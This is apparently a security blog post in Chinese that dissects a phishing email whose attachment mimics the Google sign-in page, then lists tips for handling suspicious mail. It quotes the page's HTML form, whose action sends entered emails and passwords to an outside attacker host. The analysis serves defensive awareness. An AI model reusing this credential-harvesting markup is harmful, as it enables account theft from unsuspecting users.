---

title: "Google 帳號釣魚案例"
description: "你收過釣魚信件嗎？電子郵件已經是目前常見的攻擊管道，除了惡意郵件、病毒信、釣魚信等，更有社交工程等攻擊手法。本文將分析一個簡單的 Google 帳號釣魚案例，希望大家能多防範此類攻擊！ "
category: "案例剖析"
tags: [Mail, Phishing]
author: "allenown"
keywords: "Phishing, Google, 社交工程, 網路釣魚"
og_image: ""
---


最近身邊的朋友不斷的收到 Gmail 中 Google 的警告：

![Gmail state-sponsored attacker warning](https://lh6.googleusercontent.com/-GpAMTR_IrK0/UzlQhywLcII/AAAAAAAAAO8/LgV3z4knQc4/w788-h26-no/2014-03-31-Google-Account-Phishing-Scam-01.png "Gmail state-sponsored attacker warning")

![Gmail 國家資助的攻擊者警告](https://lh4.googleusercontent.com/-4JfiexvrRVs/UzlQh7GiRPI/AAAAAAAAAOw/uGaBU031GnA/w1024-h649-no/2014-03-31-Google-Account-Phishing-Scam-03.png "Gmail 國家資助的攻擊者警告")

駭客間的戰爭已經不只是個人對個人，而已經擴大成國家對國家。一個國家為了獲取他國的機密文件、情報、個人資料等，都會想盡各種辦法入侵帳號、寄送惡意郵件、釣魚盜取密碼等。而身為受害者的我們能做什麼呢？Google 官方提出的建議是：加強密碼安全、注意登入 IP 位址、更新自己使用的軟體、[開啟二階段驗證](https://support.google.com/accounts/answer/180744?hl=zh-Hant)。當然有良好的資安意識才是更重要的。

正好今天收到一個簡單的案例，提供給各位參考。

READMORE

在信箱中躺著一封很像是國外客戶的信件「Company Profile / Order Details」。內容看起來也很正常，並且附上了公司的基本資料為附加檔案。

![釣魚信件](https://lh6.googleusercontent.com/-BczI2MA-WFw/UzlQihSF0bI/AAAAAAAAAO0/qkzfK9xXoZ8/w708-h548-no/2014-03-31-Google-Account-Phishing-Scam-04.png "釣魚信件")

點開附件，會發現畫面先跳了 JavaScript 警告視窗後，隨即導向到 Google 登入頁面。

注意看，這個登入頁面是真的嗎？有沒有發現畫面上的「Stay signed in」前面的勾變成方框了？瀏覽器上的網址也是在本機的位址。想想看，怎麼可能點了附件之後，跳轉到 Google 登入畫面？

![釣魚信件附件假冒 Google 登入](https://lh3.googleusercontent.com/-a_-JazlxC0o/UzlQiscnjDI/AAAAAAAAAPE/i9vS3hd5m_I/w897-h678-no/2014-03-31-Google-Account-Phishing-Scam-05.png "釣魚信件附件假冒 Google 登入")

讓我們看一下原始碼，會發現他的 form 被改成一個奇怪的網址，看起來就是惡意網站。其餘網頁的部份都是從 Google 真實的登入頁面抓取下來修改的。因此只要一不注意，就會以為是真的 Google 登入畫面而輸入帳號密碼。

[![釣魚信件原始碼](https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w850-h678-no/2014-03-31-Google-Account-Phishing-Scam-06.png "釣魚信件原始碼")](https://lh6.googleusercontent.com/-zI1dvdo-yQk/UzlQjVfs2gI/AAAAAAAAAPI/F4Lv_G43Tgo/w1280/2014-03-31-Google-Account-Phishing-Scam-06.png)

節錄部分 code 如下：
{% highlight html %}
 <form novalidate="" method="post" action="http://cantonfair.a78.org/yahoo/post.php" id="gaia_loginform">
  <input name="GALX" value="6UMbQQmFgwI" type="hidden">
  <input name="continue" value="http://mail.google.com/mail/" type="hidden">
  <input name="service" value="mail" type="hidden">
  <input name="hl" value="en" type="hidden">
  <input name="scc" value="1" type="hidden">
  <input name="sacu" value="1" type="hidden">
  <input id="_utf8" name="_utf8" value="☃" type="hidden">
  <input name="bgresponse" id="bgresponse" value="js_disabled" type="hidden">
  <input id="pstMsg" name="pstMsg" value="1" type="hidden">
  <input id="dnConn" name="dnConn" value="" type="hidden">
  <input id="checkConnection" name="checkConnection" value="youtube:424:1" type="hidden">
  <input id="checkedDomains" name="checkedDomains" value="youtube" type="hidden">
<label class="hidden-label" for="Email">Email</label>
<input id="Email" name="Email" placeholder="Email" spellcheck="false" class="" type="email">
<label class="hidden-label" for="Passwd">Password</label>
<input id="Passwd" name="Passwd" placeholder="Password" class="" type="password">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" value="Sign in" type="submit">
{% endhighlight %}

發現了嗎？其中 form 的 action 欄位被取代成「**http://cantonfair.a78.org/yahoo/post.php**」，而這個頁面會直接接收受害者輸入的帳號密碼，並且自動跳轉到真正的 Google 登入頁面。攻擊者從 a78.org 這個網站中直接取得所有被駭的人輸入的帳號密碼。

這是一個很簡單、典型、又易被發現的釣魚案例。如果一時不察不小心輸入了帳號密碼，下次帳號被盜的就是自己。建議大家在收取信件的時候遵循幾大原則：

1. 不隨便開啟附加檔案：附件常夾帶惡意程式、執行檔、惡意文件、釣魚網頁等，切勿隨便開啟。可使用 Google Docs 開啟附件文件防止惡意文件攻擊 Adobe PDF Reader、Microsoft Office 等程式。更常有把惡意程式加密壓縮後寄出，在信中附上密碼，借此規避防毒軟體的偵測，不可不慎。
2. 注意信件中的超連結 URL：釣魚信件常在超連結中使用惡意網站的 URL，在點選之前務必仔細檢查，更要小心「Goog**l**e」及「Goog**1**e」之類的英文數字差異。
3. 注意信件中的語氣：有的時候攻擊者仿冒你身邊可信任的人寄信給你，但是語氣、用詞要非常精準。如果出現了「**尊敬的用戶您好**」你就會發現這個應該不太像是台灣本土的信件用語。
4. 不在信件中夾帶機敏資料：信件是不安全的，切勿在信中提到帳號、密碼、個資等機密資料。
5. 不回應陌生郵件：郵件中會夾帶自己的 IP 位址，回應信件可能讓攻擊者得到這些資料。
6. 使用安全的郵件軟體：若使用安全的郵件軟體、平台，例如 Gmail，遇到惡意郵件時，會即時阻擋並且警告用戶。如果使用自己的郵件軟體，就要特別注意釣魚等攻擊。

電子郵件的攻擊已經成為滲透攻擊主要的手法之一，不少國際資安事件都是肇因於惡意郵件。例如 2013 年韓國 DarkSeoul 事件，以及竄改交易匯款資料郵件詐取匯款等。身為目標的我們更要時時注意使用電子郵件時的安全事項。